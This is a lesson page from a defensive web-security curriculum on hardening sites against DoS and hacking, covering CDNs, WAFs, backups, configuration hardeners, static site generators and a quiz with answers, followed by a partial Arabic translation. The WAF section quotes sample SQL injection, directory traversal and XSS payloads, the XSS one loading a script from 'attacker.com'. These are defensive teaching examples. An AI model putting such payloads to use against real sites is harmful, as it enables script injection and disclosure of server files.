+++
style = "module"
weight = 1
title = "Website Hardening"
description = "We explore some initial steps you can take to make your website more resilient to attack"
+++

## Use Case

There are a number of steps that can be taken to a website as a whole to make it more resilient to attack. These typically require less effort than going through the site page-by-page and can be quite impactful, so generally it’s a good idea to go through these actions first.

## Objectives

After completing this subtopic, the practitioner should be able to do the following:

- Use development and maintenance processes that ensure that their site can be re-created if the production hosting servers are unavailable.
- Use CDNs (content delivery networks) to protect their website from DoS attacks
- Use static site generators to make their site more resistant to DoS and hacking
- Use configuration hardeners and WAFs to make their site more resistant to hacking

---
## Main Section

This sub-skill covers fundamental, site-wide activities that should be performed on almost any site that wishes to be protected against attacks. While every action may not apply to every site, some apply to all sites, and all apply to some.

### How website DoS attacks work

One of the key themes of this Learning Path is DoS attacks. In order to understand how to defend against and respond to these attacks, we need to understand how they work.

#### Attack Types

DoS attacks can be broken down broadly by what layer of the application stack the attack targets, and whether the attack is volumetric or if it exploits bugs in the target software.

##### Network-level attacks

The lowest-level DoS attack type operates on the network level. The target of these attacks is the network connections between computers, routing equipment, and/or the operating system on the target. In a volumetric attack, the attacker will just send tons of network traffic to the target, trying to overwhelm the network or switching/routing capacity of the network devices connecting the target to the internet. Examples of this sort of attack are [ping floods](https://en.wikipedia.org/wiki/Ping_flood), [smurf attacks](https://en.wikipedia.org/wiki/Smurf_attack), and [NTP amplification attacks](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/).

From time to time a bug is found in a network device or server operating system that allows more efficient DoS attacks. These range from the classic “[ping of death](https://en.wikipedia.org/wiki/Ping_of_death)” from the 90’s, where a single packet could cause a server to crash, to more modern [hash collision issues](https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html).

##### Protocol-level attacks

One step up the network stack is protocol-level attacks. For web sites, these attacks will all use HTTP to try to overwhelm the web server or its backend infrastructure. Volumetric attacks are similar to network-level attacks; attackers just cause a large flood of traffic.

There also exist exploit-based DoS attacks at the protocol level; generally attacking the web server software. One example is the [HTTP slow POST attack](https://www.educative.io/answers/what-is-slow-http-post-dos-attack).

##### Application-level attacks

The final class of DoS attack is the kind that attacks a resource-expensive feature of the target website itself. Since it’s specific to the target site, this kind of attack requires more technical skills than the other types, but can be extremely effective and hard to stop. In these attacks, the threat actor will identify a function on the web site that takes a lot of resources on the server side. Examples might include a page that resizes an image (can consume a lot of server memory), sends emails (can consume disproportionate network resources and affect mail server reputation), performs a complicated search (can consume a lot of database CPU and cache), etc.

These attacks usually serve to dramatically reduce the cost of a DoS attack to the attacker. Instead of sending tens or hundred of thousands of requests per second, the attacker may be able to render a web server unresponsive with mere hundred of requests per second. Not only does this reduce the cost of the attacker in terms of requests sent, the attacker can hide their traffic more easily, since the overall traffic volume may not be significant. Also, stopping these attacks usually requires changes to the site itself, which in some cases may be quite extensive.

#### DoS vs DDoS

A DDoS (distributed denial of service) attack is a type of DoS attack where the malicious traffic comes from a large number of sources. This is as opposed to a conventional attack, where a small number of computers send out the malicious traffic. As defenders have gained skills and abilities, effective attacks are generally DDoS attacks, as conventional attacks are easy to block, and frequently do not generate sufficient traffic. Most DDoS attacks involve attackers renting time on an existing [botnet](https://en.wikipedia.org/wiki/Botnet) or hiring a dedicated[ DDoS-for-hire service](https://krebsonsecurity.com/category/ddos-for-hire/), though some extortion gangs will have their own botnets.

### Development and Site Maintenance Practices

The most fundamental thing to help prepare for and respond to attacks is to be able to rebuild the site from scratch. This is important in DoS attacks, as the site may not just be unavailable to end users, but also to site owners. In some cases, hosting providers will take down a site that’s under attack, so as to prevent their systems from being overloaded. In a hacking attack, having a “clean” copy of the site is often essential for forensics and also for post-attack cleanup.

#### Version Control

Site code and static content should be stored in a server-based version control system. Site developers are often attack targets themselves. For example, an [Azerbaijani web site owner was a victim of a phishing attack, and the attacker used their access to put a backdoor on the victim’s web site](https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/). Having a version control system, especially an externally managed one, can limit the impact of a compromise of a site maintainer. Additionally, having code and content stored remotely has other advantages if an accident, such as the loss of a laptop, occurs. Services such as [GitHub](https://docs.github.com/en) and [GitLab](https://about.gitlab.com/resources/) have free tiers that support the needs of individuals and small organizations.

#### Replicated Development Setup

If possible, site maintainers should have an isolated, access controlled environment where they can make and test changes to their website. This may be as simple as an unpublished, password-protected site on a provider like Wordpress.com or Wix, or a full multi-container Docker setup that allows a developer to have a complete environment on their laptop. In any case, making changes in production during an attack may be difficult or impossible, and it’s very easy to make mistakes in a high-stress situation. Having a separate development environment will allow site maintainers to make and test changes in a safe place before deploying those changes to production.

#### Database backups

If the website has a database, it’s important that that database be backed up and that those backups are tested. Ideally, backups should be made automatically, and old backups stored. That way, if an attacker manages to use a vulnerability like SQL injection to corrupt the database, a clean version can be restored, even if the attack isn’t detected immediately. If the database is small, it can be stored in the site’s version control system. Larger backups can be safely and inexpensively stored in systems like [AWS S3](https://aws.amazon.com/s3/) or [GCP’s Cloud Storage](https://cloud.google.com/storage?hl=en#backups-and-archives). The storage system, of course, needs to have access control enabled. Ideally, the processes that back up the data should only have permissions to add new files to the storage, not read, write, or delete existing data.

### Using DoS resistant CDNs or hosting

Since denial of service attacks are the most common threat facing civil society websites, a site owner’s next priority should be to set up basic defenses against DoS attacks. There are two ways of doing this: using a CDN with DoS protection or using a DoS-resistant hosting provider.

#### DoS resistant CDNs

CDNs (content delivery networks) originally served as a way to serve static web resources faster and with lower server costs. They were generally used by high-traffic websites. Usually, the website owner will use a special hostname (e.g. images.example.com) and give DNS control of that hostname to the CDN provider. The CDN provider has a large network of web servers, ideally placed near (in terms of network topology) to end users. These servers are called “edge” servers. When an end user performs a DNS lookup for that hostname, the CDN provider’s servers respond with the IP address of the “closest” CDN edge server. When the end user requests a resource (web page, image, sound file, etc.) from the edge server, the edge server first sees if it has the resource in its cache. If not, it requests the resource from the original website (called the “origin” server) and stores it in the cache. Once it has the resource in its cache, then it can serve it back to the end user. On subsequent requests, it will respond immediately with the cached resource. On a high-use website, this reduces load on the origin server and also results in lower network latency.

Over time the usefulness of CDNs for DoS protection became apparent. CDNs have lots of bandwidth capacity and specialized web server software, so can shrug off the onslaught of traffic from DoS attacks. This stops network level attacks, and most protocol-level attacks against static web content. For protection against protocol-level attacks against any page, websites will serve all content through the CDN, as opposed to just static content. Since the CDNs offer protection to multiple customers, they can develop specialized tools, techniques, and expertise in detecting and blocking DoS attacks.

Examples of DoS resistant CDN solutions include [Deflect](https://deflect.ca/non-profits/), [Project Shield](https://projectshield.withgoogle.com/landing), [Fastly](https://www.fastly.com/fast-forward), and [CloudFlare](https://www.cloudflare.com/galileo/).

One important caveat of using a CDN to protect your website from DoS attacks is that it is imperative that you restrict traffic to your origin web servers. Let’s say that your web site, served through a CDN, uses the hostname [www.example.com](http://www.example.com), and you use origin.example.com for your “real” origin web server. If an attacker launches a DoS attack against origin.example.com, they will completely bypass the CDN, and your site will receive no benefit. Instead, origin web servers should have IP address restrictions in place at the network level (e.g. via a firewall), or ideally be completely cut off from the Internet and only accessible via a VPN.

Additionally, there are certain misconfigurations that can cause a CDN edge server to not recognize static vs dynamic content. For example, if a website has a web page like [www.example.com/profile](http://www.example.com/profile), the CDN doesn’t automatically know that the page contains private information. The most standard way to work around this is to configure the CDN to cache based on response headers and then set a `Cache-Control` header whose value is `private` or similar. This will tell the CDN that the page contains private information, and to not give the same content to different users. The specifics of how this is configured and used will vary between CDN providers, so be sure to consult your provider’s documentation before setting up a CDN. It’s also a good idea to have a pre-release site that’s configured with the same CDN and settings as the production site. In this way, site managers can check major changes before going live.

#### DoS resistant hosting

Some providers combine web hosting with DoS resistance. Generally they have some of the same sort of technologies and practices that CDN providers use but bundled with web hosting. This avoids the issue above of protecting origin servers but depends on the provider providing both the protection and hosting services you need. Examples of DoS resistant hosting providers include [Qurium](https://www.qurium.org/secure-hosting/) and [Greenhost](https://greenhost.net/internet-freedom/).

#### Limitations of DoS resistant CDN and hosting providers

You may have noted that the protection provided by DoS resistant CDN and hosting providers covers the majority of attacks, but the above material left out application-level attacks. There may be flaws in a website that allow DoS attacks with very low volumes. Standard defenses against DoS attacks are not effective in this case. That said, support and rapid response personnel at CDN and hosting providers may be able to help support web site owners in the event that there is an active application-level DoS attack against their website.

Defending against application-level attacks is covered in more depth in the DoS Incident Response subtopic (subtopic 3 in this learning path).

### Using Web Application Firewalls

WAFs (web application firewalls) are network devices that sit in between an end user and a website’s origin server, like a CDN. While a CDN provides protection against DoS attacks, a WAF attempts to protect against hacking attacks. They will inspect incoming requests and block ones that look malicious, for example parameters containing things like `' or 1=1;--` (SQL injection), `">&lt;script src="http://attacker.com/payload.js">&lt;z a="` (XSS), or `../../../../../../etc/passwd` (directory traversal). While no WAF can provide perfect protection against hacking, they may be effective enough to protect a site from compromise, and almost always make the attacker’s job of identifying vulnerabilities more difficult. In most cases, a good WAF will not disrupt legitimate content, but it is possible for them to do so. For example, if a site was a discussion forum talking about secure web development, a WAF would likely block legitimate posts about attack techniques. As with CDNs, it’s a very good idea to have a pre-release site where changes can be tested before they go live.

Most DoS resistant CDNs also have WAF functions. There are also dedicated WAF providers who provide extra services, generally including DoS protection. For example, [Sucuri](https://sucuri.net/website-firewall/) is a WAF provider that also provides DoS protection and some backup and incident response capabilities. [WordFence](https://www.wordfence.com/products/pricing/) is a WAF provider that specializes in protecting sites built on WordPress. In addition to attempting to block generic hacking attempts and DoS attacks, it attempts to block attacks that specifically target WordPress sites.

There are also WAFs that are meant to be run on the same server or the network as the web site they’re protecting. Examples include expensive products by Barracuda and F5, and also open-source solutions such as [ModSecurity](https://github.com/SpiderLabs/ModSecurity). Note that these systems generally do not provide DoS protection on their own.

### Configuration Hardeners

Websites almost universally are built on some sort of framework that handles most of the work of serving web pages. That might be a low-level framework, like nginx, that only handles networking and basic HTTP, or a very high-level framework like WordPress, that handles everything except site content. In the vast majority of cases, the framework provides a suite of features, capabilities, and other configuration options, most of which aren’t needed by the website. These unneeded features and configurations expose the website to additional risk through increased attack surface (and potential for exposed bugs) or insecure configurations themselves.

While it’s possible to manually study the capabilities of a framework and decide how to enable features and configurations on one’s own, it’s generally far easier and more effective to use a tool or set of default baselines. These configuration hardeners usually represent thousands of hours of work to lock down a system as much as possible without rendering it unusable.

As with any system changes, it’s good, perhaps necessary, to have a separate environment in which to test changes, as well as a test process to make sure everything works properly before deploying changes to production. A site may depend upon an insecure configuration or little-used feature to work properly. In that case, it’s better to catch that before putting a reconfigured site in use.

The [DevSec Hardening Framework](https://dev-sec.io/baselines/) provides a set of security baselines for hardening a wide variety of commonly-used infrastructure software, such as Linux, MySQL, Apache, Docker, etc. Their baselines are documented on the web site, and they provide recipes for configuration managers such as Chef, Puppet, and Ansible.

Other configuration hardeners go much deeper into the frameworks they secure. An example is [Snuffleupagus](https://snuffleupagus.readthedocs.io/), which secures PHP installations. In addition to supplying configuration changes, it changes the behavior of functions to make them less dangerous. For example, it changes the `system()` function to remove potentially dangerous characters from its input, and the `mail()` function to disallow features that can be used to write arbitrary files.

While configuration hardeners can’t eliminate every vulnerability from a website, and using them requires careful testing of the site afterwards, they are one of the easiest ways to shut down or slow down exploitation of a site.

### Static Site Generators

Many websites use a content management system to manage the site, even though the content on the site doesn’t change for each visitor. While there are definitely sites that need to be updated multiple times a minute, or customize content for each visitor, most are essentially static sites. In this case, “static” means usually being updated every few hours or less. For convenience, most of these sites are dynamically generated on each visit. For normal use, that’s absolutely fine. However, for a site that’s being targeted, it presents some problems.

First of all, that dynamic behavior exposes more attack surface to adversaries. Instead of just being a web server and some files, the site is a complicated set of dynamic behavior backed up by a combination of files and databases. The latter is much more likely to contain a vulnerability that could be exploited by an attacker.

Secondly, that complex assembly of databases and scripts takes much longer to generate a HTTP response than a static site. This additional processing complexity makes denial of service attacks much more effective.

In short, if a website can work as a static site, it will be much more resilient as a static site than as a dynamic site. It also expands the site’s hosting options and lowers hosting costs, as the site can be served with things like cloud providers’ storage buckets, GitHub pages, etc.

Some static site generators have their own simple structure for site content, generally relying on a bunch of Markdown files, some HTML styling templates, and some configuration files. However, many content-management systems will use a static site generator on the backend to produce the final web site. Of course, it’s also possible to just maintain the source files in git or the like. In any case, site owners will make changes to the web site configuration, then generate, test, and upload the full static site for every change. Examples of some popular standalone static site generators include [Hugo](https://gohugo.io/) and [Jekyll](https://jekyllrb.com/). For content management, examples of CMSes that use static site generators include [Cloud Cannon](https://cloudcannon.com/jamstack-ecosystem/static-site-generators/) or [Static CMS](https://www.staticcms.org/docs/add-to-your-site).

The downside of migrating to a static web site generator like Hugo or Jekyll is that you have to migrate your existing content. For websites using a different CMS, this can be a lot of work. It may be possible to use a static site generator for your existing platform, though. One popular example is [WP2Static](https://wp2static.com/), an [open-source](https://github.com/elementor/wp2static) WordPress plugin that will turn a WordPress site into a static one. There’s still migration that may be needed, [contact forms](https://wp2static.com/docs/basics/contact-forms-for-static-sites/) will need to be changed, and will need to be migrated to a 3rd party service like [Disqus](https://help.disqus.com/en/articles/1717131-importing-comments-from-wordpress), [ReplyBox](https://getreplybox.com/docs/importing-wordpress-comments/), or many others. Note that using a 3rd party commenting service will put another party in control of your site users’ comments.

## Skill Check

Website hardening plays a critical role in safeguarding online assets against various cyber threats. This set of challenging multiple-choice questions explores the core concepts of website hardening, focusing on key strategies and technologies aimed at enhancing the resilience of web applications against common vulnerabilities. From development and maintenance processes ensuring site availability to the implementation of content delivery networks (CDNs) and static site generators, these questions delve into the intricacies of fortifying websites against hacking attempts.

Test your knowledge of website hardening practices and gain insights into the essential measures to bolster the security posture of your online platforms.If possible, discuss your answers to those questions with a peer or Mentor who will help verify that you’ve correctly understood the topic.

1. What development and maintenance process ensure a website can be recreated if production hosting servers are unavailable?

A) Regularly updating website plugins and themes\
B) Implementing multi-factor authentication for admin accounts\
C) Using version control systems and automated backups\
D) Enforcing strict password policies for user accounts

{{< question title="Answer and explanation" >}}
1. Correct Answer: C) Using version control systems and automated backups

Explanation: Using version control systems (such as Git) and automated backups ensures that the website's codebase and data are securely stored and can be easily restored in case of server failures or data loss. This practice helps maintain the integrity of the website and minimizes downtime.
{{< /question >}}

2. How can a CDN (Content Delivery Network) help protect a website from Denial of Service (DoS) attacks?

A) By distributing website content across multiple servers to handle traffic spikes\
B) By encrypting all data transmitted between the server and client\
C) By providing additional layers of authentication for user logins\
D) By automatically blocking access to suspicious IP addresses

{{< question title="Answer and explanation" >}}
2. Correct Answer: A) By distributing website content across multiple servers to handle traffic spikes

Explanation: A CDN (Content Delivery Network) helps protect a website from DoS attacks by distributing its content across multiple servers located in various geographic locations. This distribution helps distribute the incoming traffic load, reducing the impact of DoS attacks and ensuring that the website remains accessible to users even during periods of high traffic.
{{< /question >}}

3. Which technology can enhance a website's resistance to DoS (Denial of Service) and hacking by serving pre-rendered HTML pages to users?

A) Serverless computing platforms\
B) Dynamic web application frameworks\
C) Content Management Systems (CMS)\
D) Static site generators

{{< question title="Answer and explanation" >}}
3. Correct Answer: D) Static site generators

Explanation: Static site generators create websites by generating HTML pages from source files during the build process. Since static sites do not rely on server-side processing or databases, they are inherently more resistant to hacking and DoS attacks. Static sites are also typically faster to load and easier to cache, further enhancing their resilience to attacks.
{{< /question >}}

4. How do configuration hardeners and WAFs (Web Application Firewalls) contribute to making a website more resistant to hacking?

A) By optimizing server performance and resource usage\
B) By implementing additional layers of authentication for user logins\
C) By automatically detecting and blocking known attack patterns and suspicious traffic\
D) By encrypting all data transmitted between the server and client

{{< question title="Answer and explanation" >}}
4. Correct Answer: C) By automatically detecting and blocking known attack patterns and suspicious traffic

Explanation: Configuration hardeners and WAFs (Web Application Firewalls) help make a website more resistant to hacking by automatically detecting and blocking known attack patterns and suspicious traffic. These security measures act as a barrier between the website and potential attackers, filtering incoming requests and traffic to prevent malicious activities and unauthorized access.
{{< /question >}}

الموضوع الفرعي 1: تعزيز حماية موقع الويب
حالة استخدام
يوجد عدد من الخطوات يمكن اتخاذها لموقع الويب ككل لجعله أكثر مرونة ضد الهجوم، ويتطلب ذلك عادةً جهدًا أقل مقارنة بالمرور على الموقع صفحة بصفحة ويمكن أن تكون ذات تأثير قوي ولذلك من الجيد عمومًا تنفيذ هذه الإجراءات أولًا.
الأهداف 

بعد استكمال هذا الموضوع الفرعي، يجب أن يكون الممارس قادرًا على القيام بما يلي:
استخدام عمليات التطوير والصيانة التي تضمن إمكانية إعادة إنشاء موقعهم إذا كانت خوادم استضافة المنتج غير متوفرة.
استخدام شبكات توصيل المحتوى (content delivery networks) لحماية موقع الويب الخاص بهم من هجمات حجب الخدمة
استخدام مُولد مواقع الويب الثابتة لجعل موقعهم أكثر مقاومة لحجب الخدمة والاختراق
استخدام معززات حماية التكوين وجدران حماية تطبيقات الويب لجعل موقعهم أكثر مقاومة للاختراق
العرض 
تُغطي هذه المهارة الفرعية الأنشطة الأساسية على مستوى الموقع والتي يجب تنفيذها في أي موقع تقريبًا يرغب في الحماية من الهجمات، وعلى الرغم من أن كل إجراء قد لا ينطبق على كل موقع، إلا أن بعضها ينطبق على جميع المواقع وكلها تنطبق على بعضها. 
كيف تعمل هجمات حجب الخدمة على موقع الويب؟
إحدى الموضوعات الرئيسية لمسار التعلّم هذا هو هجمات حجب الخدمة من أجل فهم كيفية الدفاع ضد هذه الهجمات والرد عليها ونحتاج إلى فهم كيفية عملها.
أنواع الهجوم
يمكن تقسيم هجمات حجب الخدمة على نطاق واسع حسب طبقة التطبيق التي تستهدفها الهجمات، وما إذا كان الهجوم ضخمًا أو إذا كان يستغل الأخطاء في البرنامج المستهدف.
الهجمات على مستوى الشبكة
يعمل نوع هجوم حجب الخدمة الأقل مستوى على مستوى الشبكة، والهدف منه هو هجمات اتصالات الشبكة بين أجهزة الكمبيوتر و/أو معدات التوجيه و/أو نظام التشغيل على الهدف. في الهجمات التي تعتمد على الحجم، يرسل المهاجم كميات كبيرة من حركة مرور الشبكة إلى الهدف، في محاولة لاجتياح الشبكة أو قدرة التبديل/التوجيه لأجهزة الشبكة التي تربط الهدف بالإنترنت. ومن الأمثلة على هذا النوع من الهجمات هي بينغ فلودز (أي "فيضانات أو إغراقات" بينغ) (ping floods) وهجمات السنافر (smurf attacks) وهجمات تضخيم بروتوكول زمن الشبكة. 
من وقت لآخر يمكن العثور على خطأ في جهاز شبكة أو نظام تشغيل الخادم الذي يسمح بهجمات حجب خدمة أكثر كفاءة تتراوح هذه من "البينغ المميت" الكلاسيكي من التسعينيات، حيث يمكن أن تتسبب حزمة واحدة في تعطل الخادم، إلى مشاكل تصادم التجزئة الأكثر حداثة.
الهجمات على مستوى البروتوكول
تتمثل إحدى خطوات زيادة مكدس الشبكة في الهجمات على مستوى البروتوكول، وبالنسبة لمواقع الويب، ستستخدم جميع هذه الهجمات بروتوكول نقل النص التشعبي لمحاولة التغلب على خادم الويب أو البنية الأساسية للواجهة الخلفية. تُشبه الهجمات الحجمية الهجمات على مستوى الشبكة حيث يتسبب المهاجمون فقط بتدفق كبير لحركة المرور. 
توجد أيضًا هجمات حرمان خدمة مستندة إلى الاستغلال على مستوى البروتوكول، وبشكل عام مهاجمة برنامج خادم الويب. أحد الأمثلة على ذلك هو هجوم بوست (POST) البطيء على بروتوكول نقل النص التشعبي.
الهجمات على مستوى التطبيق
تُعدّ الفئة الأخيرة من هجوم حجب الخدمة هي النوع الذي يهاجم العناصر التي تتطلب الكثير من الموارد لموقع الويب المستهدف نفسه، ونظرًا لأنه يكون مخصصًا للموقع المستهدف، يتطلب هذا النوع من الهجوم مهارات تقنية أكثر من الأنواع الأخرى ولكن يمكن أن يكون فعالًا للغاية ويصعب إيقافه. في هذه الهجمات سيحدد ممثل التهديد وظيفة على موقع الويب تتطلب الكثير من الموارد على جانب الخادم. قد تتضمن الأمثلة صفحة تقوم بتغيير حجم صورة (يمكن أن تستهلك الكثير من ذاكرة الخادم)، وترسل رسائل بريد إلكتروني (يمكن أن تستهلك موارد شبكة غير متناسبة وتؤثر على سمعة خادم البريد)، وتجري بحثًا معقدًا (يمكن أن تستهلك الكثير من وحدة المعالجة المركزية وذاكرة التخزين المؤقت لقاعدة بيانات)، وما إلى ذلك. 
عادة ما تعمل هذه الهجمات على التقليل بشكل كبير من تكلفة هجوم حجب الخدمة بالنسبة للمهاجم. وبدلًا من إرسال عشرات أو مئات الآلاف من الطلبات في الثانية، قد يتمكن المهاجم من جعل خادم الويب لا يستجيب مع المئات من الطلبات في الثانية فقط. لا يؤدي هذا فقط إلى تقليل تكلفة المهاجم من حيث الطلبات المرسلة، بل يمكن للمهاجم إخفاء حركة المرور الخاصة به بسهولة أكبر نظرًا لأن حجمها الإجمالي قد لا يكون كبيرًا، بالإضافة إلى أن وقف هذه الهجمات عادة ما يتطلب تغييرات في الموقع نفسه وقد تكون في بعض الحالات واسعة النطاق. 
هجوم حجب الخدمة مقابل هجوم حجب الخدمة الموزع
الهجمات الموزّعة لحجب الخدمة هي نوع من هجمات حجب الخدمة تأتي فيه حركة المرور الضارة من عدد كبير من المصادر وهو على عكس الهجوم التقليدي حيث يرسل عدد صغير من أجهزة الكمبيوتر حركة المرور الضارة. مع اكتساب المدافعين مهارات وقدرات، أصبحت الهجمات الفعّالة عمومًا هي هجمات موزعة لحجب الخدمة، لأنه من السهل حجب الهجمات التقليدية وغالبًا لا تُولد حركة مرور كافية. تتضمن معظم هجمات حجب الخدمة الموزعة. مهاجمين يستأجرون وقتشبكة روبوتات موجودة بالفعل أو يستأجرون هجمات موزعة لحجب الخدمة على شكل خدمة مخصصة متاحة للاستئجار، لكن بعض العصابات الهادفة إلى الابتزاز سيكون لها شبكات روبوتات خاصة بها. 
ممارسات تنمية وصيانة الموقع
أهم شيء يساعد في الاستعداد للهجمات والرد عليها هو أن تكون قادرًا على إعادة بناء الموقع من الصفر. هذا مهم في هجمات حجب الخدمة حيث قد يصبح الموقع غير متاحًا للمستخدمين النهائيين فحسب بل أيضًا لمالكي الموقع. في بعض الحالات، سيقوم مقدمو خدمات الاستضافة بإزالة الموقع الذي يتعرض للهجوم لأجل تجنّب فرط تحميل قدرة أنظمتهم. في هجمات الاختراق غالبًا ما يكون الحصول على نسخة "نظيفة" من الموقع ضروريًا لأجل إجراء التحليل الجنائي وأيضًا للتنظيف بعد الهجوم.
التحكم بالإصدار 
يجب تخزين التعليمات البرمجية للموقع والمحتوى الثابت في نظام تحكم بالإصدار مستند إلى خادم، وغالبًا ما يكون مطورو المواقع أنفسهم هدفًا للهجوم. على سبيل المثال، كان مالك أذربيجاني لموقع على الإنترنت ضحية لهجوم تصيد احتيالي، واستخدم المهاجم وصوله لفتح باب خلفي على موقع الضحية. يمكن أن يؤدي وجود نظام للتحكم بالإصدار، وبالأخص النظام المدار خارجيًا إلى الحد من تأثير اختراق مشرف الموقع. بالإضافة إلى ذلك، فإن تخزين التعليمات البرمجية والمحتوى عن بُعد يوفر مزايا أخرى في حالة وقوع حادث مثل فقدان جهاز الكمبيوتر المحمول. تحتوي خدمات مثل غيت هب (GitHub) وغيت لاب (GitLab) على مستويات مجانية تدعم احتياجات الأفراد والمنظمات الصغيرة. 
إعداد التطوير المتماثل
إذا كان ذلك ممكنًا، يجب أن يكون لدى القائمين على صيانة الموقع بيئة معزولة توفر إمكانية وصول مضبوطة حيث يمكنهم إجراء تغييرات على موقعهم على الويب واختبارها. قد يكون هذا أمرًا بسيطًا مثل موقع غير منشور ومحمي بكلمة مرور على مزود مثل ووردبرس دوت كوم (Wordpress.com) أو ويكس (Wix)، أو يمكن إعداده بالكامل من خلال عدة مستوعبات على داكر مما يتيح للمطور بيئة كاملة على جهاز الكمبيوتر المحمول الخاص به. على أي حال، قد يكون إجراء تغييرات على المنتج أثناء الهجوم أمرًا صعبًا أو مستحيلًا، ومن السهل جدًا ارتكاب الأخطاء في المواقف عالية التوتر. سيسمح وجود بيئة تطوير منفصلة لمسؤولي صيانة الموقع بإجراء التغييرات واختبارها في مكان آمن قبل نقل هذه التغييرات إلى المنتج.
النسخ الاحتياطية لقاعدة البيانات
إذا كان موقع الويب يحتوي على قاعدة بيانات، فمن المهم إبقاء نسخة احتياطية من قاعدة البيانات هذه واختبار هذه النسخ الاحتياطية، ومن الناحية المثالية يجب إجراء النسخ الاحتياطية تلقائيًا وتخزين النسخ الاحتياطية القديمة. بهذه الطريقة إذا تمكن المهاجم من استخدام ثغرة أمنية مثل حقن إس كيو إل (SQL) لإفساد قاعدة البيانات، يمكن استعادة نسخة نظيفة حتى لو لم يتم اكتشاف الهجوم على الفور. إذا كانت قاعدة البيانات صغيرة يمكن تخزينها ضمن نظام التحكم بالإصدار الخاص بالموقع. ويمكن تخزين النسخ الاحتياطية الأكبر بشكل آمن وغير مكلف على أنظمة مثل إيه دبليو إس إس 3 (AWS S3) أو التخزين السحابي الخاص بجي سي ب (GCP). بالطبع يحتاج نظام التخزين إلى تمكين ميزة التحكم بالوصول، ومن الناحية المثالية يجب أن تحتوي العمليات التي تنتج نسخة احتياطية من البيانات فقط على أذونات لإضافة ملفات جديدة إلى التخزين وليس قراءة البيانات الموجودة أو كتابتها أو حذفها. 
استخدام شبكات توصيل المحتوى المقاومة أو الاستضافة المقاومة لهجمات حجب الخدمة
نظرًا لأن هجمات حجب الخدمة هي التهديد الأكثر شيوعًا الذي يواجه مواقع المجتمع المدني، يجب أن تكون الأولوية التالية لمالك الموقع هي إنشاء دفاعات أساسية ضد هجمات حجب الخدمة. هناك طريقتان للقيام بذلك هما استخدام شبكة توصيل المحتوى مع حماية ضد هجمات حجب الخدمة أو استخدام مزود استضافة مقاوم لهجمات حجب الخدمة.
استخدام شبكات توصيل المحتوى المقاومة لهجمات حجب الخدمة
كانت شبكات توصيل المحتوى في الأصل بمثابة وسيلة لخدمة موارد الويب الثابتة بشكل أسرع وبتكاليف خادم أقل، وكانت تستخدم بشكل عام من قبل مواقع الويب ذات حركة المرور العالية. عادةً ما يستخدم مالك موقع الويب اسم مضيف مميز (مثل images.example.com) ويعطي تحكم في خدمة أسماء المجالات لاسم المضيف إلى مزوّد شبكة توصيل المحتوى. يمتلك مزود شبكة توصيل المحتوى شبكة كبيرة من خوادم الويب، موجودة من الناحية المثالية بالقرب من المستخدمين النهائيين (من حيث طوبولوجيا الشبكة). تسمى هذه الخوادم خوادم "الحافة"، وعندما يجري المستخدم النهائي بحثًا على نظام اسم المجال عن اسم المضيف ذلك، تستجيب خوادم مزود شبكة توصيل المحتوى بعنوان بروتوكول الإنترنت لخادم حافة شبكة توصيل المحتوى "الأقرب". عندما يطلب المستخدم النهائي موردًا (صفحة ويب أو صورة أو ملف صوت، إلخ) من خادم الحافة، يرى خادم الحافة أولًا ما إذا كان يحتوي على المورد في ذاكرة التخزين المؤقت الخاصة به. وإذا لم يكن لديه يطلب المورد من موقع الويب الأصلي (يسمى خادم "الأصل") ويخزنه في ذاكرة التخزين المؤقت. بمجرد انتقال المورد إلى ذاكرة التخزين المؤقت الخاصة به، يمكنه تقديمه إلى المستخدم النهائي، وخلال الطلبات اللاحقة، سيرد على الفور باستخدام المورد المخزن مؤقتًا. على موقع ويب عالي الاستخدام، يقلل هذا من الحمل على خادم الأصل ويؤدي أيضًا إلى تقليل وقت استجابة الشبكة.
مع بمرور الوقت أصبحت فائدة شبكات توصيل المحتوى واضحة في الحماية من هجمات حجب الخدمة، حيث تتمتع شبكات توصيل المحتوى بسعة نطاق ترددي واسعة وبرامج خادم ويب متخصصة وبالتالي يمكن أن تُبدد حركة المرور من هجمات حجب الخدمة وتوقف الهجمات على مستوى الشبكة ومعظم الهجمات على مستوى البروتوكول ضد محتوى الويب الثابت. للحماية من الهجمات على مستوى البروتوكول ضد أي صفحة، تقوم مواقع الويب بتقديم كامل المحتوى من خلال شبكة توصيل المحتوى بدلًا من مجرد المحتوى الثابت. نظرًا لأن شبكات توصيل المحتوى توفر الحماية للعديد من العملاء، يمكنها تطوير أدوات وتقنيات وخبرات متخصصة في اكتشاف هجمات حجب الخدمة وحظرها. 
تتضمن أمثلة حلول شبكة توصيل المحتوى المقاومة لحجب  الخدمة دفلكت (Deflect) وبروجكت شيلد (Project Shield) وفاستلي (Fastly) وكلاودفلير (CloudFlare).
إحدى التحذيرات المهمة لاستخدام شبكة توصيل المحتوى لحماية موقع الويب الخاص بك من هجمات حجب الخدمة هو أنه من الضروري تقييد حركة المرور على خوادم الويب الأصلية الخاصة بك. لنفترض أن موقعك على الويب الذي يتم تقديمه من خلال شبكة توصيل المحتوى يستخدم اسم المضيف www.example.، وتستخدم أنت origin.example.com لخادم الويب الأصلي "الحقيقي". إذا أطلق أحد المهاجمين هجوم حجب خدمة ضد origin.example.com، فسيتجاوز شبكة توصيل المحتوى تمامًا ولن يستفيد موقعك على الإطلاق. بدلًا من ذلك يجب أن يكون لخوادم الويب الأصلية قيود على عنوان بروتوكول الإنترنت على مستوى الشبكة (على سبيل المثال عبر جدار حماية) أو أن تكون معزولة تمامًا عن الإنترنت ولا يمكن الوصول إليها إلا عبر شبكة ظاهرية خاصة.
